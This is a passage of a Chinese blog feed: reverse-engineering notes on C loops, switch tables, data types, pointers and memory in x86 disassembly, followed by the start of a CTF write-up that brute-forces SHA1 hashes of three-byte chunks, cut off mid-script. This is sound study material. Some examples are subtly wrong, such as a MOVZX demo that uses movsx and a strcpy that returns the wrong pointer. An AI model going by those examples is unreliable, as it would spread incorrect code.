class="hljs-string">&quot;%s&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, <span class="hljs-string">&quot;D&quot;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">9</span>:<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, <span class="hljs-string">&quot;Z&quot;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, <span class="hljs-string">&quot;Error&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291125123.png" alt="202212241120544" /></p><center><strong> Switch语句中的大表</strong></center><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">Fun</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br><span class="hljs-keyword">switch</span> (x) &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">101</span>:<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">108</span>:<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, <span class="hljs-string">&quot;X&quot;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">109</span>:<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, <span class="hljs-string">&quot;Y&quot;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">110</span>:<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, <span class="hljs-string">&quot;Z&quot;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, <span class="hljs-string">&quot;Error&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291125399.png" alt="202212241139348" /></p><center><strong> Switch语句中的小表</strong></center><h3 id="while"><a class="markdownIt-Anchor" href="#while"></a> while</h3><ol><li>根据条件跳转指令所跳转到的地址，可以得到循环语句块的结束地址</li><li>根据 jmp 指令所跳转到的地址，可以得到循环语句块的起始地址</li><li>在还原while 比较时，条件跳转的逻辑与源码相反</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">Fun</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span>&#123;<br><span class="hljs-keyword">while</span> (x &lt; y)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, x);<br>x++;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291125717.png" alt="202212241157555" /></p><center><strong> while语句</strong></center><h3 id="for"><a class="markdownIt-Anchor" href="#for"></a> for</h3><ol><li>第一个 jmp 指令之前为赋初值部分</li><li>第一个 jmp 指令所跳转的地址为循环条件判定部分起始</li><li>判断条件后面的跳转指令条件成立时跳转的循环体外面</li><li>条件判断跳转指令所指向的地址上面有一个 jmp， jmp地址为表达式3的起始位置</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">Fun</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)</span>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=x;i&lt;y;i++)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,i);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291125748.png" alt="202212241200812" /></p><center><strong> for语句</strong></center><h1 id="数据"><a class="markdownIt-Anchor" href="#数据"></a> 数据</h1><h2 id="数据类型及存储"><a class="markdownIt-Anchor" href="#数据类型及存储"></a> 数据类型及存储</h2><h3 id="c语言数据类型"><a class="markdownIt-Anchor" href="#c语言数据类型"></a> c语言数据类型</h3><ol><li><p><strong>基本类型</strong></p><ul><li><p>整数类型</p></li><li><p>浮点类型</p></li></ul></li><li><p><strong>构造类型</strong></p><ul><li><p>数组类型</p></li><li><p>结构体类型</p></li><li><p>共用体(联合)类型</p></li></ul></li><li><p><strong>指针类型</strong></p></li><li><p><strong>空类型(void)</strong></p></li></ol><ul><li>数据类型三个要素<ul><li>存储数据的宽度</li><li>存储数据的格式</li><li>作用范围(作用域)</li></ul></li></ul><h3 id="基本类型"><a class="markdownIt-Anchor" href="#基本类型"></a> 基本类型</h3><h4 id="整数类型"><a class="markdownIt-Anchor" href="#整数类型"></a> 整数类型</h4><table><thead><tr><th>数据类型</th><th>长度(bit)</th><th>长度(字节)</th><th>汇编中表示</th></tr></thead><tbody><tr><td>char</td><td>8BIT</td><td>1字节</td><td>BYTE</td></tr><tr><td>short</td><td>16BIT</td><td>2字节</td><td>WORD</td></tr><tr><td>int</td><td>32BIT</td><td>4字节</td><td>DWORD</td></tr><tr><td>long</td><td>32BIT</td><td>4字节</td><td></td></tr></tbody></table><ul><li>认为划分为<strong>有符号(signed)<strong>与</strong>无符号(unsigned)</strong>，其在计算机中存储方式相同，但是根据需求认定为不同的数值</li></ul><h4 id="浮点类型"><a class="markdownIt-Anchor" href="#浮点类型"></a> 浮点类型</h4><ul><li><strong>float</strong>和<strong>double</strong></li><li>二者在存储方式上遵从<strong>IEEE</strong>规范</li></ul><ol><li>float的存储方式</li></ol><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291125885.png" alt="202212222043652" /></p><ol start="2"><li>double的存储方式</li></ol><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291125982.png" alt="202212222044090" /></p><ol start="3"><li>将一个float型转化为内存存储格式：<ul><li>先将这个实数的绝对值化为二进制格式</li><li>将这个二进制格式实数的小数点左移或右移n位，直到小数点移动到第一个有效数字(1)的右边</li><li>从小数点右边第一位开始数出二十三位数字放入第22到第0位</li><li>将移动位数+127并转化为二进制放入第30到23位(例如:右移3位，即127+(-3) = 124)</li><li>若原本数字为负数，则在符号位填入“1”；否则，填入“0”</li></ul></li></ol><h4 id="类型转换"><a class="markdownIt-Anchor" href="#类型转换"></a> 类型转换</h4><ul><li><p><code>MOVSX</code>先符号扩展，再传送，适用于有符号类型转换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,0xFF<br>movsx cx,al<br>;此时cx == 0XFFFF(看0xFF的第一位是什么，FF == 1111 1111，首位是1，扩展8个1)<br></code></pre></td></tr></table></figure></li><li><p><code>MOVZX</code>先零扩展，再传送，适用于无符号类型转换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,0xFF<br>movsx cx,al<br>;此时cx == 0XFF(直接在FF前面补8个0)<br></code></pre></td></tr></table></figure></li><li><p>小数据类型向大数据类型转换</p><ul><li>采用保留低位数据，舍弃高位数据</li></ul></li></ul><h3 id="构造类型"><a class="markdownIt-Anchor" href="#构造类型"></a> 构造类型</h3><h4 id="数组类型"><a class="markdownIt-Anchor" href="#数组类型"></a> 数组类型</h4><ul><li><p>一组相同类型的变量，为了方便读写，采用另外一种表示形式。其在声明的时候，必须用常量来指明长度，不能使用变量(<strong>常量是因为在编译的时候，编译器就要知道开辟的缓冲区的大小，所以必须是常量</strong>)</p></li><li><p>数组在使用时，可以通过变量来定位数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//例如：</span><br><span class="hljs-type">int</span> arr[m][n][k] = &#123;&#123;&#125;,&#123;&#125;……&#125;;<br><br><span class="hljs-comment">//寻找arr[3][2][1]</span><br><span class="hljs-comment">/* </span><br><span class="hljs-comment">在编译器中，寻找方式为arr[3*n+2*k+1]。</span><br><span class="hljs-comment">一维数组与多维数组的本质没有区别，arr[m*n*k]与arr[m][n][k]开辟相同</span><br><span class="hljs-comment">*/</span>  <br></code></pre></td></tr></table></figure></li></ul><h4 id="结构体类型"><a class="markdownIt-Anchor" href="#结构体类型"></a> 结构体类型</h4><ul><li>本质是大量数据的内存复制</li></ul><h3 id="指针类型"><a class="markdownIt-Anchor" href="#指针类型"></a> 指针类型</h3><h4 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h4><ol><li><p>格式：<code>数据类型* 变量名</code></p></li><li><p>宽度为4字节， * 可以是任意数量</p></li><li><p>加减操作(+/-/++/–)都是<code>以数据类型的宽度为标准</code>进行增加或减少，例如：char为1，int为4。</p><p><code>总结</code>：加减增加的是去掉一个 * 之后的数据宽度，若是char **，增加的就是4字节</p></li><li><p><code>两种类型相互加减</code>：</p><ul><li>两个类型相同的带 * 类型的变量可以进行减法操作，减完后的数据类型是去掉 * 的数据类型</li><li>相减的结果要除以去掉一个 * 的数据类型的宽度</li></ul></li></ol><h4 id="运用"><a class="markdownIt-Anchor" href="#运用"></a> 运用</h4><ol><li><p><code>&amp;</code> 是地址符，类型是其后面的类型加一个 * ，任何变量都可以使用&amp;来获取地址，但不能用在常量上</p></li><li><p><code>带 * 类型的变量</code>，可以通过在其变量前加 * 来获取<code>其指向内存中存储的值</code>，即在带 * 类型的变量前面加*，类型是其原来的类型减去一个 * 。</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> x;<br>&amp;x<span class="hljs-comment">//(int*)</span><br>    <br><span class="hljs-type">int</span>* y;<br>*y<span class="hljs-comment">//(int)</span><br></code></pre></td></tr></table></figure><h4 id="结合"><a class="markdownIt-Anchor" href="#结合"></a> 结合</h4><ol><li>指针函数<ul><li>返回值为指针的函数----函数</li></ul></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span>* <span class="hljs-title function_">strcpy</span> <span class="hljs-params">(<span class="hljs-type">char</span>* dest,<span class="hljs-type">char</span>* src)</span><br>&#123;<br><span class="hljs-keyword">while</span>((*(dest++)=*(src++))!=<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">return</span> dest;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>函数指针<ul><li>声明----返回类型(*函数名)(参数表)</li></ul></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//声明</span><br><span class="hljs-type">int</span> (*pFun)(<span class="hljs-type">int</span>,<span class="hljs-type">int</span>);<br><span class="hljs-comment">//赋值</span><br>pFun = (<span class="hljs-type">int</span> (*)(<span class="hljs-type">int</span>,<span class="hljs-type">int</span>))<span class="hljs-number">10</span>;<br>pFun = 函数名;<br></code></pre></td></tr></table></figure><ol start="2"><li>指针数组<ul><li>数组的类型是指针类型----数组</li></ul></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span>* arr[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br></code></pre></td></tr></table></figure><ol start="3"><li>数组指针<ul><li>本质是指针，<code>不必指向数组</code>，只是使用定义的数组的宽度</li></ul></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//变量名px，数据类型 int[5]</span><br><span class="hljs-type">int</span>(*px)[<span class="hljs-number">5</span>];<br><br><span class="hljs-comment">//例子</span><br><span class="hljs-type">int</span> arr[<span class="hljs-number">15</span>] = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>&#125;;<br><span class="hljs-type">int</span>(*p)[<span class="hljs-number">2</span>];<br>p = (<span class="hljs-type">int</span>(*) [<span class="hljs-number">2</span>])arr;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d %d\n&quot;</span>, *(*(p+<span class="hljs-number">1</span>)+<span class="hljs-number">1</span>), *(p + <span class="hljs-number">1</span>)[<span class="hljs-number">1</span>], p[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]);<br></code></pre></td></tr></table></figure><ol start="3"><li>结构体指针<ul><li>结构体</li></ul></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c">Struct Arg<br>&#123;<br>   <span class="hljs-type">int</span> a;<br>   <span class="hljs-type">int</span> b;<br>   <span class="hljs-type">int</span> c;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">function</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-comment">//创建结构体</span><br>    Student s;<br>    s.a = <span class="hljs-number">10</span>;<br>    <span class="hljs-comment">//声明结构体指针</span><br>    Student* ps;<br>    <span class="hljs-comment">//为结构体指针赋值</span><br>    ps = &amp;s;<br>    <span class="hljs-comment">//通过指针读取数据</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,ps-&gt;a);<br>    <br>    <span class="hljs-comment">//还可以使用其他指针类型对结构体指针进行赋值，此时结构体指针可以利用自己的构造遍历未知空间数据</span><br>    <span class="hljs-type">int</span> x = <span class="hljs-number">100</span>;<br>    Arg* px = (Arg*)&amp;x;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d %d\n&quot;</span>,px-&gt;a,px-&gt;b,px-&gt;c);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="内存"><a class="markdownIt-Anchor" href="#内存"></a> 内存</h1><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291126765.png" alt="202212222123177" /></p><h2 id="变量"><a class="markdownIt-Anchor" href="#变量"></a> 变量</h2><h3 id="全局变量"><a class="markdownIt-Anchor" href="#全局变量"></a> 全局变量</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> g_n = <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">Function</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> x = <span class="hljs-number">2</span>;<br><span class="hljs-type">int</span> y = <span class="hljs-number">3</span>;<br><br><span class="hljs-keyword">return</span> g_n+x+y;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>全局变量在程序编译完成后地址就已经确定下来了，只要程序启动，全局变量就已经存在了，启动后里面是否有值取决于声明时是否给定了初始值，如果没有，默认为0</li><li>全局变量的值可以被所有函数所修改，里面存储的是最后一次修改的值</li><li>全局变量所占内存会一直存在，知道整个进程结束</li><li>全局变量的反汇编识别，通过寄存器的宽度，或者byte/word/dword 来判断全局变量的宽度<ul><li><code>MOV REG,byte/word/dword ptr ds:[0x12345678]</code></li></ul></li><li><strong>全局变量就是所谓的基址</strong></li></ol><h3 id="局部变量"><a class="markdownIt-Anchor" href="#局部变量"></a> 局部变量</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">Function</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> x = <span class="hljs-number">2</span>;<br><span class="hljs-type">int</span> y = <span class="hljs-number">3</span>;<br><br><span class="hljs-keyword">return</span> g_n+x+y;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>局部变量在程序编译完成后并没有分配固定的地址</li><li>在所属的方法没有被调用时，局部变量并不会分配内存地址，只有当所属的程序被调用了，才会在堆栈中分配内存</li><li>当局部变量所属的方法执行完毕后，局部变量所占用的内存将变成垃圾数据。局部变量消失</li><li>局部变量只能在方法内部使用，函数A无法使用函数B的局部变量</li><li>局部变量的反汇编识别<ul><li><code>[ebp-4]</code>，<code>[ebp-8]</code>，<code>[ebp-0xC]</code>等</li></ul></li></ol><h3 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h3><p>​这里需要注意，这是针对普通的函数所写出的地址对应，即<code>push edp……</code>等操作，如果是个裸函数，或自定义函数，则不再适配</p><ul><li><p>全局变量----一个固定的地址，类似<code>byte/word/dword ptr ds:[0x12345678]</code>类型</p></li><li><p>局部变量----<code>[ebp-x]</code>，类似<code>[ebp-4]</code>，<code>[ebp-8]</code>，<code>[ebp-0xC]</code>等</p></li><li><p>传入参数----<code>[ebp+x]</code>，类似<code>[ebp+8]</code>，<code>[ebp+0xC]</code>等(x≠4)</p></li><li><p>特殊----</p><ul><li><code>[ebp]</code>存储的是ebp在被push前的数值</li><li><code>[ebp+4]</code>存储是call返回时的EIP指向的地址</li></ul></li></ul><h2 id="常量"><a class="markdownIt-Anchor" href="#常量"></a> 常量</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//样例一</span><br><span class="hljs-type">char</span>* x = <span class="hljs-string">&quot;china&quot;</span>;<br><span class="hljs-type">char</span> y[] = <span class="hljs-string">&quot;china&quot;</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Function</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">//报错，其中&quot;china&quot;存储在常量区，不能对其进行修改，但是可以修改x的指向(地址)</span><br>*(x+<span class="hljs-number">1</span>) = <span class="hljs-string">&#x27;A&#x27;</span>;<br><span class="hljs-comment">//正常，y[]存储的字符串存储在全局变量区域(从常量区复制过来的)，可以进行修改</span><br>y[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;A&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//样例二</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Function</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">char</span>* x = <span class="hljs-string">&quot;china&quot;</span>;<br><span class="hljs-type">char</span> y[] = <span class="hljs-string">&quot;china&quot;</span>;<br><span class="hljs-comment">//报错</span><br>*(x+<span class="hljs-number">1</span>) = <span class="hljs-string">&#x27;A&#x27;</span>;<br><span class="hljs-comment">//正常</span><br>y[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;A&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>总结：</p><ul><li>&quot;china&quot;字符串存储在常量区内，不可以进行修改</li><li><code>*(x+1)</code>中的x指向的是&quot;china&quot;在常量区的地址，直接对x进行修改就是修改常量区的数据，报错</li><li><code>y[1]</code>中的数组在堆栈中开辟，常量区中的&quot;china&quot;被复制到了eax等寄存器中，成为了变量，修改y就是修改堆栈中的变量部分，所以正常运行。即y[1]不修改常量区内容，而是复制到变量区再进行修改</li></ul><h2 id="内存分配与释放"><a class="markdownIt-Anchor" href="#内存分配与释放"></a> 内存分配与释放</h2><ul><li>自动分配内存(c语言)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span>* ptr;<span class="hljs-comment">//声明指针</span><br><br><span class="hljs-comment">//在堆中申请内存,分配128个int</span><br>ptr = (<span class="hljs-type">int</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>)*<span class="hljs-number">128</span>);<br><br><span class="hljs-comment">//无论申请的空间大小 一定要进行校验 判断是否申请成功</span><br><span class="hljs-keyword">if</span>(ptr == <span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//初始化分配的内存空间</span><br><span class="hljs-built_in">memset</span>(ptr,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>)*<span class="hljs-number">128</span>);<br><br><span class="hljs-comment">//使用。。。</span><br>*(ptr) = <span class="hljs-number">1</span>;<br><br><span class="hljs-comment">//使用完毕 释放申请的堆空间</span><br><span class="hljs-built_in">free</span>(ptr);<br><br><span class="hljs-comment">//将指针设置为NULL</span><br>ptr = <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure><ul><li>注意事项：<ol><li>使用 sizeof(类型)*n 来定义申请内存的大小</li><li>malloc 返回类型为 void* 类型  需要强制转换</li><li>无论申请的内存有多小，一定要判断是否申请成功</li><li>申请完空间后要记得初始化</li><li>使用完一定要是否申请的空间</li><li>将指针的值设置为NULL</li></ol></li></ul>]]></content>
    
    
    <categories>
      
      <category>逆向笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【NewStartCTF】Reverse_Week4</title>
    <link href="/posts/c66ef6f9.html"/>
    <url>/posts/c66ef6f9.html</url>
    
    <content type="html"><![CDATA[<h1 id="hash"><a class="markdownIt-Anchor" href="#hash"></a> Hash</h1><h2 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h2><ul><li>无壳，直接分析，发现是每3个字节进行sha1加密</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304232130791.png" alt="image-20230423213033751" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304232130663.png" alt="image-20230423213042625" /></p><h2 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> exp</h2><p>直接进行爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br><br>text=[<span class="hljs-string">&#x27;A2F17ED1C6A8BC31769CDF654DF4B8A937042CB6&#x27;</span>,<span class="hljs-string">&#x27;0CA8A2EDB0C1D34A432A5A4464E0D6ABD847C831&#x27;</span>,<span class="hljs-string">&#x27;C359D69F3F08BB920F2C3B51133205533462093E&#x27;</span>,<span class="hljs-string">&#x27;CC5C3FE6E7356A26A134CFF5633349F597C40A9D&#x27;</span>,<span class="hljs-string">&#x27;4AC4BB3F27F245BA9178651AA5CDEDCBB2862E2A&#x27;</span>,<span class="hljs-string">&#x27;A01E33F4DCDB6BA1AE9F34A97CF8F6DEEEDF1A8D&#x27;</span>,<span class="hljs-string">&#x27;D3AF70912A8C1B22CFDECE071BA36BC4662B58FA&#x27;</span>,<span class="hljs-string">&#x27;9395EAB195D25B676D7D07075D3838A9AC19DF21&#x27;</span>,<span class="hljs-string">&#x27;FDB43C5EF76ECDA0C1661D6D199B5BFAC1DB538A&#x27;</span>,<span class="hljs-string">&#x27;DA8E9997A010BE78B20108CE79FEC1FB9C63D8DC&#x27;</span>,<span class="hljs-string">&#x27;809DA627F1AD01D65864C376E3179B62D9D74261&#x27;</span>,<span class="hljs-string">&#x27;8F61EE21AC7579626934E0FFB6A62B3D4A82EEC4&#x27;</span>,<span class="hljs-string">&#x27;E2A954758FDB61F869998E9788B7B7E48480B832&#x27;</span>,<span class="hljs-string">&#x27;B8E3349B97532B27AA62B8718B68240179158144&#x27;</span>]<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(text)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(text[i]))<br><br>modle = <span class="hljs-built_in">list</span>(itertools.product(<br>    [<span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>,<br>     <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span 